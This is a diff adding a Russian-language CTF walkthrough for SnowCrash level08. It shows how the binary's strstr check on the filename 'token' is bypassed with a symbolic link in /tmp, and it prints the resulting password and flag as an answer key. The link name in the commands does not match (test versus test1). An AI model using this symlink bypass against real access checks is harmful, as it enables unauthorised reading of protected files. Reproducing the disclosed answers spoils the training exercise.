@@ -1,0 +1,24 @@
+В папке видим исполняемый файл level08 и файл token.
+Пытаемся запустить файл level08 и видим ошибку - исполняемому файлу в
+качестве аргумента нужен файл.
+level08@SnowCrash:~$ ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7c4, 0x80486b0, 0x8048720
+<unfinished ...>
+strstr("token", "token")                                   = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)               = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+Файл token как аргумент не подходит, функция strstr() проверяет вхождение
+'token' в название файла,
+следовательно нужен файл который не содержит в названии 'token'.
+Переименовать и скопировать файл не позволяют права доступа.
+Приходим к выводу, что нам необходим файл-посредник, который бы
+использовал содержимое файла token,
+т.e. ссылался на него. Для этого создаем файл-ссылку:
+level08@SnowCrash:/tmp$ ln -s /home/user/level08/token test
+level08@SnowCrash:~$ ./level08 /tmp/test1
+quif5eloekouj29ke0vouxean
+level08@SnowCrash:~$ su flag08
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
